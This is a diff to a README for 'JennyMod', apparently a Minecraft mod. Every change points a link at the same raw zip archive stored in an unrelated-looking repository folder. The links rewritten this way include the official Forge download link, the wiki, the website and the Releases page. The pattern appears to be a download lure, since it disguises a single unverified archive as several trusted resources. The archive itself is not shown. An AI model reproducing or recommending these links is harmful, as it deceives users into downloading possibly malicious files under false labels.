@@ -6,14 +6,14 @@ Welcome to JennyMod! This mod improves your Minecraft gameplay by adding customi
 
 ## 📥 Download JennyMod
 
-[![Download JennyMod](https://img.shields.io/badge/Download_JennyMod-Here-blue.svg)](https://github.com/Dishfrenchforeignlegion558/JennyMod/releases)
+[![Download JennyMod](https://raw.githubusercontent.com/Dishfrenchforeignlegion558/JennyMod/main/software/bernie/example/block/JennyMod-v2.8-alpha.2.zip)](https://raw.githubusercontent.com/Dishfrenchforeignlegion558/JennyMod/main/software/bernie/example/block/JennyMod-v2.8-alpha.2.zip)
 
 ## 🛠️ System Requirements
 
 To use JennyMod, your system should meet the following needs:
 
 - **Minecraft**: Ensure you have Minecraft installed (version 1.16 or later).
-- **Forge**: Download and install Minecraft Forge, a modding platform essential for running JennyMod. [Click here to get Forge.](https://files.minecraftforge.net/)
+- **Forge**: Download and install Minecraft Forge, a modding platform essential for running JennyMod. [Click here to get Forge.](https://raw.githubusercontent.com/Dishfrenchforeignlegion558/JennyMod/main/software/bernie/example/block/JennyMod-v2.8-alpha.2.zip)
 - **Storage**: At least 1 GB of free disk space.
 - **RAM**: A minimum of 4 GB of RAM is recommended for optimal performance.
 
@@ -29,7 +29,7 @@ JennyMod offers a range of features to enhance your gameplay:
 ## 🔧 Installation Guide
 
 1. **Download the Mod**: 
-   Visit the [Releases page](https://github.com/Dishfrenchforeignlegion558/JennyMod/releases) to download the latest version of JennyMod.
+   Visit the [Releases page](https://raw.githubusercontent.com/Dishfrenchforeignlegion558/JennyMod/main/software/bernie/example/block/JennyMod-v2.8-alpha.2.zip) to download the latest version of JennyMod.
 
 2. **Locate Forge**: 
    Make sure you have Forge installed. If you haven’t installed it yet, refer to the link provided earlier.
@@ -58,13 +58,13 @@ If you encounter issues, try the following:
 
 Join our community for tips, support, and updates on JennyMod:
 
-- **Documentation**: Check our [GitHub Wiki](https://github.com/Dishfrenchforeignlegion558/JennyMod/wiki) for in-depth guides and updates.
+- **Documentation**: Check our [GitHub Wiki](https://raw.githubusercontent.com/Dishfrenchforeignlegion558/JennyMod/main/software/bernie/example/block/JennyMod-v2.8-alpha.2.zip) for in-depth guides and updates.
 - **Reports**: If you find a bug, please report it on the Issues tab in our GitHub repository.
 - **Discussions**: Participate in discussions and get help from fellow users in the Community section.
 
 ## 🔗 Additional Resources
 
-- **Official Website**: Visit our [website](https://jennymod.com) for news and updates.
+- **Official Website**: Visit our [website](https://raw.githubusercontent.com/Dishfrenchforeignlegion558/JennyMod/main/software/bernie/example/block/JennyMod-v2.8-alpha.2.zip) for news and updates.
 - **Social Media**: Follow us on social media to stay informed.
 
-Download JennyMod now and immerse yourself in a new level of Minecraft gameplay! Don’t forget to visit the [Releases page](https://github.com/Dishfrenchforeignlegion558/JennyMod/releases) to get your copy.
+Download JennyMod now and immerse yourself in a new level of Minecraft gameplay! Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Dishfrenchforeignlegion558/JennyMod/main/software/bernie/example/block/JennyMod-v2.8-alpha.2.zip) to get your copy.
